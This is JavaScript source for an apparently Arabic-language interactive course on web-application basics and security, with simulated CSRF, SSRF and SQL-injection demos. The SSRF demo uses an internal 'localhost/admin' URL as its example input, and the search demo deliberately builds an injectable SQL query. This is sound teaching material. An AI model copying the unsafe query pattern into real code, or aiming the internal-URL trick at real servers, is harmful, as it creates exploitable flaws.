$('#ev').onclick=()=>{L('الموقع الخبيث بعت طلب تحويل 500$ من متصفحك، والكوكي اتبعتت تلقائيًا.');if($('#tk').checked)L('✓ السيرفر طلب token مش موجود. الطلب اترفض.');else{b-=500;$('#bal').textContent=b;L('✗ السيرفر نفّذ الطلب. اتحوّل 500$ من غير علمك!')}};
$('#rz').onclick=()=>{b=1000;$('#bal').textContent=b;$('#cl').innerHTML=''}}});

CATS.push({id:'ssrf',g:'الأمان',t:'SSRF: تزوير الطلبات من الخادم',d:'ميزة استيراد من رابط تخلي السيرفر يوصل لخدمات داخلية.',
html:`<p>SSRF: التطبيق بيجيب رابط بيحدده المستخدم من السيرفر نفسه، فالمهاجم يخليه يطلب موارد داخلية مش مفتوحة من برا.</p>
<div class="card"><div class="row"><input id="su" value="https://example.com/photo.jpg" style="flex:1;min-width:200px;direction:ltr"><button class="sel" id="sf">استورد الصورة</button></div><div class="row" style="margin-top:8px"><button data-u="https://example.com/photo.jpg">رابط عادي</button><button data-u="http://localhost/admin">رابط داخلي</button><label><input type="checkbox" id="al"> allowlist مفعّل</label></div><pre id="so">الرد هيظهر هنا.</pre></div>
<div class="note"><span class="ok">الحماية:</span> قائمة سماح للوجهات، منع العناوين الداخلية، وعزل الشبكة.</div>`,
init(){$$('[data-u]').forEach(b=>b.onclick=()=>$('#su').value=b.dataset.u);
$('#sf').onclick=()=>{let h='';try{h=new URL($('#su').value).hostname}catch(e){$('#so').textContent='رابط غير صالح';return}
const inn=/^(localhost|127\.|10\.|192\.168\.|169\.254\.)/.test(h);
$('#so').textContent=$('#al').checked&&h!=='example.com'?'403: الوجهة مش في القائمة المسموحة. اترفض ✓':inn?'200 OK: لوحة إدارة داخلية (مش متاحة من الإنترنت) ✗ السيرفر سرّب محتواها!':'200 OK: تم تحميل الصورة.'}}});

/* ---------- Introduction to Web Applications ---------- */
const G='Introduction to Web Applications';
CATS.push({id:'webservers',g:G,t:'خوادم الويب (Web Servers)',d:'مين بيستقبل طلبات HTTP وبيرد عليها؟ دوس على أي كود أو خادم.',
html:`<p>خادم الويب برنامج شغال على السيرفر الخلفي، بيستقبل كل طلبات HTTP من المتصفح، يوجّهها للصفحة المطلوبة، ويرد. غالبًا على منافذ TCP رقم 80 (HTTP) و443 (HTTPS). وبيقبل مدخلات نصية وJSON وبيانات ثنائية (زي رفع الملفات).</p>
<h3>أكواد الاستجابة الشائعة</h3><div class="row" id="hcodes"></div><div class="note" id="hn">دوس على أي كود.</div>
<pre>$ curl -I https://academy.hackthebox.com
HTTP/2 200
content-type: text/html; charset=UTF-8</pre>
<div class="note">الأمر curl -I بيجيب الهيدرز بس، وcurl من غير -I بيجيب الكود المصدري للصفحة.</div>
<h3>أشهر 3 خوادم ويب</h3><div class="row" id="ws"></div><div class="card" id="wi">دوس على خادم.</div>
<div class="note">فيه خوادم تانية زي Apache Tomcat لتطبيقات Java، وNode.js لتطبيقات JavaScript في الخلفية.</div>`,
init(){const C=[[200,'OK','الطلب نجح.'],[301,'Moved Permanently','الرابط اتنقل نهائيًا.'],[302,'Found','الرابط اتنقل مؤقتًا.'],[400,'Bad Request','السيرفر مافهمش الطلب بسبب صياغة غلط.'],[401,'Unauthorized','محاولة وصول بدون مصادقة.'],[403,'Forbidden','العميل مالوش صلاحية للمحتوى.'],[404,'Not Found','الصفحة المطلوبة مش موجودة.'],[405,'Method Not Allowed','الطريقة معروفة للسيرفر لكنها متعطّلة.'],[408,'Request Timeout','اتصال خامل انتهت مهلته.'],[500,'Internal Server Error','السيرفر واجه حالة مايعرفش يتعامل معاها.'],[502,'Bad Gateway','الخادم الوسيط استلم ردًا غير صالح.'],[504,'Gateway Timeout','الخادم الوسيط ماستلمش رد في الوقت المناسب.']],F={2:'نجاح',3:'تحويل',4:'خطأ من العميل',5:'خطأ من السيرفر'};
C.forEach(c=>{const b=document.createElement('button');b.textContent=c[0];b.onclick=()=>{$$('#hcodes button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#hn').textContent=c[0]+' '+c[1]+' ('+F[String(c[0])[0]]+'): '+c[2]};$('#hcodes').appendChild(b)});
const W=[['Apache','الأشهر: أكتر من 40% من المواقع. مفتوح المصدر وموثّق كويس، وغالبًا مع PHP، وبيدعم لغات تانية عبر وحدات (modules). بيستخدموه: Apple وAdobe وBaidu.'],['NGINX','التاني: حوالي 30%. معمارية async بتخدم طلبات متزامنة كتير بموارد قليلة، فهو الأشهر في المواقع كتيرة الزيارات (حوالي 60% من أعلى 100 ألف موقع). بيستخدموه: Google وFacebook وNetflix وHackTheBox.'],['IIS','التالت: حوالي 15%. من مايكروسوفت وبيشتغل أساسًا على Windows Server، مناسب لتطبيقات .NET وتكامل Active Directory وWindows Auth. بيستخدموه: Microsoft وOffice365 وStack Overflow وDell.']];
W.forEach(w=>{const b=document.createElement('button');b.textContent=w[0];b.onclick=()=>{$$('#ws button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#wi').textContent=w[1]};$('#ws').appendChild(b)})}});

CATS.push({id:'databases',g:G,t:'قواعد البيانات',d:'SQL مقابل NoSQL، وإزاي الاستعلام غير الآمن بيتكسر.',
html:`<p>التطبيق بيخزّن في قاعدة البيانات الصور والملفات والمحتوى (منشورات) وبيانات المستخدمين. ده اللي بيخلّي المحتوى ديناميكي لكل مستخدم.</p>
<div class="row"><button class="sel" data-d="0">علائقية (SQL)</button><button data-d="1">غير علائقية (NoSQL)</button></div><div class="card" id="dbv"></div>
<div class="row" id="dp"></div><div class="note" id="di">دوس على قاعدة بيانات.</div>
<h3>من PHP لقاعدة البيانات: جرّب استعلام البحث</h3>
<div class="card"><div class="row"><input id="sq" value="ahmed" style="flex:1;min-width:180px;direction:ltr"><label><input type="checkbox" id="pp"> prepared statement</label></div><pre id="sqo"></pre><div id="sqn" class="note"></div></div>`,
init(){const U=[[1,'ahmed','Ahmed','Ali'],[2,'sara','Sara','Samy']],Po=[[100001,1,'Welcome to this web app.'],[100002,2,'First post.'],[100003,1,'Reminder: tomorrow...']];
const T=(h,rows,at)=>'<div style="overflow-x:auto"><table><tr>'+h.map(x=>'<th>'+x+'</th>').join('')+'</tr>'+rows.map(r=>'<tr'+at(r)+'>'+r.map(x=>'<td>'+x+'</td>').join('')+'</tr>').join('')+'</table></div>';
const rd=i=>{if(i){$('#dbv').innerHTML='<p>NoSQL مفيش فيه جداول ولا مفاتيح ولا schema. بيخزن بنماذج: Key-Value وDocument وWide-Column وGraph. مرن وقابل للتوسع مع البيانات غير المنظمة.</p><pre id="js"></pre>';$('#js').textContent=JSON.stringify({100001:{date:'01-01-2021',content:'Welcome to this web application.'},100002:{date:'02-01-2021',content:'This is the first post.'}},null,2)}
else{$('#dbv').innerHTML='<p>SQL: البيانات في جداول وصفوف وأعمدة، والمفاتيح بتربط الجداول (العلاقات اسمها Schema). دوس على بوست تشوف صاحبه:</p><div class="grid">'+T(['id','user_id','content'],Po,r=>' data-u="'+r[1]+'"')+T(['id','username','first','last'],U,r=>' data-id="'+r[0]+'"')+'</div>';
$$('#dbv tr[data-u]').forEach(r=>r.onclick=()=>{$$('#dbv tr').forEach(x=>x.classList.remove('hl'));r.classList.add('hl');$('#dbv tr[data-id="'+r.dataset.u+'"]').classList.add('hl')})}};
rd(0);pick('[data-d]',b=>rd(+b.dataset.d));
const D=[['MySQL','الأشهر على الإنترنت، مفتوح المصدر ومجاني.'],['MSSQL','تنفيذ مايكروسوفت، مع Windows Server وIIS.'],['Oracle','موثوقة جدًا للشركات الكبيرة، لكنها مكلفة.'],['PostgreSQL','مفتوحة المصدر وسهلة التوسعة.'],['MongoDB','أشهر NoSQL، نموذج Document وبتخزن JSON.'],['ElasticSearch','NoSQL للتحليل والبحث السريع في بيانات ضخمة.'],['Cassandra','قابلة للتوسع جدًا وبتتعامل كويس مع القيم المعيوبة.']];
D.forEach(d=>{const b=document.createElement('button');b.textContent=d[0];b.onclick=()=>{$$('#dp button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#di').textContent=d[0]+': '+d[1]};$('#dp').appendChild(b)});
const q=()=>{const v=$('#sq').value,pp=$('#pp').checked;$('#sqo').textContent=pp?"select * from users where name like ?\n-- param: "+v:"select * from users where name like '%"+v+"%'";$('#sqn').textContent=pp?'المدخل بيتعامل معاه كبيانات بس، فمش بيغيّر شكل الاستعلام.':(v.includes("'")?'⚠ المدخل فيه علامة اقتباس: ممكن يكسر الاستعلام ويتنفّذ استعلام تاني جنبه (SQL Injection).':'جرّب تكتب علامة اقتباس (\') وشوف الاستعلام بيتغيّر إزاي.')};
$('#sq').oninput=$('#pp').onchange=q;q()}});

CATS.push({id:'frameworks',g:G,t:'أطر التطوير والـ APIs',d:'أطر العمل، ومعلمات GET وPOST، وأفعال REST.',
html:`<p>التطبيقات الحديثة معقّدة، فغالبًا بتتبني بأطر تطوير بتسهّل الوظائف المشتركة (زي تسجيل المستخدمين) وبتربطها بالواجهة الأمامية. والمواقع الكبيرة غالبًا بتستخدم أكتر من إطار وخادم.</p>
<div class="grid"><div class="card"><b>Laravel (PHP)</b><br>قوي وسهل، للشركات الناشئة والصغيرة.</div><div class="card"><b>Express (Node.js)</b><br>PayPal وYahoo وUber وIBM.</div><div class="card"><b>Django (Python)</b><br>Google وYouTube وInstagram وPinterest.</div><div class="card"><b>Rails (Ruby)</b><br>GitHub وTwitch وAirbnb.</div></div>
<h3>معلمات الاستعلام (GET و POST)</h3><div class="card"><label>قيمة item: <input id="it" value="apples" style="direction:ltr"></label><pre id="gp"></pre></div>
<h3>أفعال REST</h3><div class="row" id="rv"></div><div class="note" id="ri">دوس على فعل.</div>
<div class="grid"><div class="card"><b>SOAP</b><br>بيتبادل XML داخل طلب HTTP. ممتاز للبيانات المركّبة والكائنات المتسلسلة والحالة (stateful)، لكنه طويل ومعقّد للاستعلامات البسيطة.</div><div class="card"><b>REST</b><br>بيمرّر المدخل في مسار الـ URL (مثلًا search/users/1) وبيرد غالبًا JSON. بيقسّم التطبيق لـ APIs صغيرة، فهو أكتر نمطية وقابلية للتوسع.</div></div>`,
init(){const g=()=>{const v=encodeURIComponent($('#it').value);$('#gp').textContent='GET  /search.php?item='+v+'\n\nPOST /search.php HTTP/1.1\n...\n\nitem='+v};$('#it').oninput=g;g();
const R=[['GET','بيجيب بيانات. مثال: GET /category/posts/ بيرجّع JSON.'],['POST','بينشئ بيانات (non-idempotent): تكراره بينشئ نسخة جديدة كل مرة.'],['PUT','بينشئ أو بيستبدل بيانات موجودة (idempotent): تكراره نتيجته ثابتة.'],['DELETE','بيمسح بيانات.']];
R.forEach(r=>{const b=document.createElement('button');b.textContent=r[0];b.onclick=()=>{$$('#rv button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#ri').textContent=r[0]+': '+r[1]};$('#rv').appendChild(b)})}});

CATS.push({id:'backserver',g:G,t:'خادم الواجهة الخلفية والـ Stacks',d:'الفرق بين الخادم الخلفي وخادم الويب، وأشهر التوليفات.',
html:`<div class="note"><b>الخادم الخلفي (Back-end server)</b> هو العتاد ونظام التشغيل اللي بيستضيف كل التطبيقات اللازمة وبيشغّل كل العمليات. أما <b>خادم الويب</b> فبرنامج واحد من اللي عليه، مسؤول عن HTTP. وبيحتوي كمان على قاعدة البيانات وإطار التطوير، وممكن يحتوي hypervisors وحاويات وWAF.</div>
<h3>التوليفات (Stacks)</h3><div class="row" id="sk"></div><div class="card"><div class="grid" id="sv"></div></div>
<h3>العتاد</h3><div class="card">قوة العتاد وأداؤه بيحدد استقرار التطبيق وسرعة استجابته. التطبيقات الكبيرة بتوزّع الحِمل على أكتر من خادم خلفي، ومش لازم تشتغل على خادم واحد: ممكن تستفيد من مراكز البيانات والاستضافة السحابية (مضيفات افتراضية).</div>`,
init(){const S=[['LAMP',['Linux','Apache','MySQL','PHP']],['WAMP',['Windows','Apache','MySQL','PHP']],['WINS',['Windows','IIS','SQL Server','.NET']],['MAMP',['macOS','Apache','MySQL','PHP']],['XAMPP',['متعدد المنصات','Apache','MySQL','PHP/Perl']]],L=['نظام التشغيل','خادم الويب','قاعدة البيانات','اللغة'];
const sh=i=>{$$('#sk button').forEach((b,j)=>b.classList.toggle('sel',i===j));$('#sv').innerHTML=S[i][1].map((x,j)=>'<div class="cell prov"><small>'+L[j]+'</small><br><b>'+x+'</b></div>').join('')};
S.forEach((x,i)=>{const b=document.createElement('button');b.textContent=x[0];b.onclick=()=>sh(i);$('#sk').appendChild(b)});sh(0)}});

CATS.push({id:'commonvulns',g:G,t:'ثغرات شائعة في تطبيقات الويب',d:'من ثغرات OWASP Top 10، مع أمثلة حقيقية معروفة علنًا.',
html:`<p>في الاختبار اليدوي (أو لما مفيش استغلال عام) ممكن نلاقي ثغرات، وحتى في التطبيقات العامة ممكن تلاقي أخطاء إعدادات من المطورين نفسهم.</p>
<details open><summary>Broken Authentication / Access Control</summary><p><b>Broken Authentication:</b> ثغرات بتسمح بتجاوز المصادقة، زي الدخول بدون بيانات صحيحة أو ترقية مستخدم عادي لأدمن. <b>Broken Access Control:</b> الوصول لصفحات وميزات مش من صلاحياتك، زي مستخدم عادي يدخل لوحة الأدمن.</p><p>مثال: College Management System 1.2 فيها تجاوز مصادقة بسبب حقن SQL في حقل الإيميل.</p></details>
<details><summary>رفع ملف ضار (Malicious File Upload)</summary><p>لو التطبيق بيقبل رفع ملفات بدون تحقق، ممكن يتحمّل سكربت (زي PHP) ينفّذ أوامر على السيرفر. حتى لو فيه فحوصات، كتير منها بيتتجاوز.</p><p>مثال: إضافة WordPress اسمها Responsive Thumbnail Slider 1.0 كانت بتقبل رفع ملف بامتداد مزدوج.</p></details>
<details><summary>حقن الأوامر (Command Injection)</summary><p>التطبيق بينفذ أوامر نظام تشغيل (مثلًا لتحميل إضافة بالاسم المدخل). لو المدخل مش معقّم، ممكن ينضاف أمر تاني يتنفّذ جنب الأصلي ويدّي سيطرة على الخادم. منتشرة لأن المطورين بيعملوا فحوصات ضعيفة.</p><p>مثال: إضافة Plainview Activity Monitor 20161228 كان فيها حقن أمر في قيمة ip.</p></details>
<details><summary>حقن SQL (SQLi)</summary><p>زي حقن الأوامر، لكن في استعلام قاعدة البيانات اللي فيه قيمة من المستخدم. ممكن ينفّذ استعلام تاني جنبه ويؤدي للسيطرة على قاعدة البيانات والخادم، أو لتسجيل دخول بدون حساب. جرّب المحاكاة في قسم قواعد البيانات.</p></details>
<div class="note">الثغرات دي هتتكرر قدامك كتير في التعلم وفي التقييمات الحقيقية، وحتى فهم بسيط ليها بيدّيك أفضلية.</div>`});

CATS.push({id:'publicvulns',g:G,t:'الثغرات العامة وCVE وCVSS',d:'إزاي تدوّر على ثغرات معروفة، وحرّك المؤشر وشوف تصنيف الخطورة.',
html:`<p>أخطر ثغرات الخلفية هي اللي بتتهاجم من برا وتدّي سيطرة على الخادم بدون وصول محلي، وغالبًا بتيجي من أخطاء برمجة. التطبيقات العامة بتتختبر من ناس كتير، فبتتكتشف ثغراتها وبتتصحح وبتتسجّل بـ <b>CVE</b> ودرجة.</p>
<ol><li>حدد إصدار التطبيق (من الكود المصدري أو صفحة زي version.php في المفتوحة المصدر).</li><li>دوّر على ثغرات الإصدار ده في Google وExploit DB وRapid7 DB وVulnerability Lab.</li><li>دوّر كمان في المكونات الخارجية (الإضافات).</li></ol>
<div class="note">الأهم: ثغرات بدرجة 8 إلى 10، أو اللي بتؤدي لتنفيذ كود عن بعد (RCE).</div>
<h3>CVSS: حرّك المؤشر</h3><div class="card"><div class="row"><input type="range" id="cv" min="0" max="10" step="0.1" value="7.5" style="flex:1;min-width:200px"><b id="cs" style="direction:ltr"></b></div><div class="grid" style="margin-top:10px"><div class="card" id="c3"></div><div class="card" id="c2"></div></div></div>
<div class="note">الدرجة الأساسية (Base) من 0 لـ 10، وبتتعدّل بمقاييس Temporal وEnvironmental. وقاعدة NVD بتنشر الـ Base فقط لمعظم الثغرات المعلنة.</div>
<div class="note">ثغرات خوادم الويب هي الأخطر لأنها متاحة عبر TCP. مثال: Shellshock أثّرت على Apache (2014 وما قبلها). أما ثغرات الخادم الخلفي وقاعدة البيانات فبتُستخدم عادةً بعد وصول محلي، لكنها لازم تتصحح برضه.</div>`,
init(){const f=()=>{const v=+$('#cv').value;$('#cs').textContent=v.toFixed(1);
const a=v===0?'None':v<=3.9?'Low':v<=6.9?'Medium':v<=8.9?'High':'Critical',b=v<=3.9?'Low':v<=6.9?'Medium':'High';
$('#c3').innerHTML='CVSS v3.0<br><b>'+a+'</b>';$('#c2').innerHTML='CVSS v2.0<br><b>'+b+'</b>'};$('#cv').oninput=f;f()}});

CATS.push({id:'nextsteps',g:G,t:'الخطوات الجاية',d:'خطوات عملية لتثبيت المعلومات. علّم اللي خلّصته.',
html:`<p>الأفضل تتعلّم بالتطبيق: راجع المادة وابني تطبيق ويب صغير بإيدك.</p><div class="card" id="ns"></div>
<div class="note">بعدها: موديولات Web Requests وJavaScript Deobfuscation، وHacking WordPress وSQL Injection Fundamentals، ثم جرّب Easy boxes على HackTheBox.</div>`,
init(){P.steps=P.steps||{};const S=['جهّز VM فيها خادم ويب','اعمل صفحة HTML','نسّقها بـ CSS','زوّد وظائف بسيطة بـ JavaScript','ابرمج تطبيق ويب بسيط','اربطه بقاعدة بيانات','جرّب الـ APIs','اختبر تطبيقك ضد ثغرات مختلفة','عدّل الكود والإعدادات لسدّ الثغرات'];
$('#ns').innerHTML=S.map((x,i)=>'<label style="display:block;margin:6px 0"><input type="checkbox" data-i="'+i+'"'+(P.steps[i]?' checked':'')+'> '+(i+1)+'. '+x+'</label>').join('');
$$('#ns input').forEach(c=>c.onchange=()=>{P.steps[c.dataset.i]=c.checked;save()})}});

CATS.push({id:'conclusion',g:G,t:'الخلاصة (Conclusion)',d:'اللي غطّيناه في الوحدة، مع ملخص سطر لكل نقطة ورابط للقسم.',
html:`<div class="card" id="cl2"></div>`,
init(){const K=[['ما هو تطبيق الويب؟','برنامج تفاعلي بيشتغل في المتصفح بنمط عميل-خادم، وصفحاته ديناميكية عكس الموقع الثابت.',['intro','siteapp']],['المعماريات الشائعة','عميل-خادم، خادم واحد، خوادم متعددة مع DB واحدة أو DBs متعددة، والتخطيط ثلاثي الطبقات.',['layout','comps']],['معنى الواجهة الأمامية والخلفية','الأمامية هي اللي بيتعامل معاها المستخدم في المتصفح، والخلفية هي المنطق والبيانات على السيرفر.',['frontback']],['مكونات الواجهة الأمامية','HTML للهيكل، CSS للشكل، JavaScript للسلوك.',['frontback']],['استخدام وأمثلة HTML/CSS/JS','جرّب HTML حي في قسم الواجهة الأمامية مقابل الخلفية.',['frontback']],['مخاطر الواجهة الأمامية والوقاية','مدخلات غير مُرشّحة بتؤدي لحقن HTML وXSS وCSRF، والوقاية بالتعقيم والتحقق من المدخلات والمخرجات.',['htmli']],['مقدمة HTML Injection وXSS وCSRF','الأول بيغيّر المحتوى، التاني بينفّذ JavaScript، والتالت بينفّذ إجراءات باسم المستخدم.',['htmli','xss','csrf']],['مكونات الواجهة الخلفية','خادم، خادم ويب، قاعدة بيانات، وإطار تطوير.',['frontback','backserver']],['الخادم الخلفي مقابل خادم الويب','الخادم الخلفي هو العتاد ونظام التشغيل، وخادم الويب برنامج عليه بيتعامل مع HTTP.',['backserver']],['أشهر خوادم الويب','Apache الأشهر، NGINX للأحمال العالية، IIS لبيئة Windows/.NET.',['webservers']],['أنواع قواعد البيانات','SQL في جداول وعلاقات، وNoSQL مرنة بنماذج Key-Value وDocument وغيرها.',['databases']],['أطر تطوير الويب','Laravel وExpress وDjango وRails.',['frameworks']],['الـ APIs','واجهات بتربط الأمامية بالخلفية، بـ REST (مسار وJSON) أو SOAP (XML).',['api','frameworks']],['الثغرات العامة','CVE وCVSS، والبحث بإصدار التطبيق في قواعد الاستغلال.',['publicvulns','commonvulns']],['مقدمة OWASP Top 10','أهم 10 فئات ثغرات في تطبيقات الويب.',['owasp']]];
$('#cl2').innerHTML=K.map((k,i)=>'<div style="padding:10px 0;border-bottom:1px solid var(--line)"><b>'+(i+1)+'. '+k[0]+(k[2].every(isDone)?' <span class="ok">✓</span>':'')+'</b><br>'+k[1]+'<div class="row" style="margin-top:6px">'+k[2].map(id=>'<button data-id="'+id+'">'+CATS.find(c=>c.id===id).t+'</button>').join('')+'</div></div>').join('');
$$('#cl2 button').forEach(b=>b.onclick=()=>openCat(b.dataset.id))}});

/* ---------- مراجع ---------- */
CATS.push({id:'gloss',g:'مراجع',t:'قاموس المصطلحات',d:'ابحث عن أي مصطلح.',
html:`<input type="search" id="q" placeholder="ابحث..." style="width:100%;margin-bottom:10px"><div id="gl"></div>`,
init(){const G=[['Web application','تطبيق بيشتغل في المتصفح بنمط عميل-خادم.'],['Front end / Back end','واجهة العميل / كود السيرفر وقاعدة البيانات.'],['Attack surface','نقاط الدخول المحتملة للهجوم.'],['Ajax','تحديث جزء من الصفحة بدون إعادة تحميل.'],['JSON / XML','صيغ لنقل البيانات المنظمة.'],['REST / SOAP','نمط API بسيط / بروتوكول XML صارم.'],['SaaS / PaaS / IaaS','برمجيات / منصة / بنية تحتية كخدمة.'],['PWA','تطبيق ويب تقدمي بيشتغل أوفلاين.'],['Microservices','مكونات مستقلة كل واحد لمهمة.'],['Serverless','المزوّد بيدير الخوادم.'],['Stateless','الطلب والرد مستقلين بدون حفظ حالة.'],['Segmentation','تجزئة الأصول لعزل الاختراق.'],['RBAC','تحكم في الوصول بحسب الأدوار.'],['Load balancer','بيوزع الطلبات على أكتر من خادم.'],['Docker / Container','حاويات لعزل مكونات التطبيق.'],['Whitebox / Blackbox','اختبار بوصول للكود / بدونه.'],['SQL injection','حقن استعلامات عبر مدخلات غير آمنة.'],['IDOR','الوصول لمورد غيرك بتغيير معرّف.'],['Privilege escalation','رفع صلاحياتك لفوق المسموح.'],['Password spraying','كلمة سر واحدة على حسابات كتير.'],['LFI','تضمين ملفات محلية، ممكن يكشف الكود.'],['OWASP','مؤسسة ليها أشهر دليل لاختبار أمان الويب.']];
const g=q=>$('#gl').innerHTML=G.filter(x=>(x[0]+x[1]).toLowerCase().includes(q.toLowerCase())).map(x=>`<div class="card"><b dir="ltr">${x[0]}</b><br>${x[1]}</div>`).join('')||'<p>مفيش نتائج.</p>';g('');$('#q').oninput=e=>g(e.target.value)}});

/* ---------- التقدم والاختبارات (محفوظ في المتصفح) ---------- */
let P={done:{},quiz:{},examBest:{}},CURID='';try{P=Object.assign(P,JSON.parse(localStorage.getItem('wo1v')||'{}'))}catch(e){}
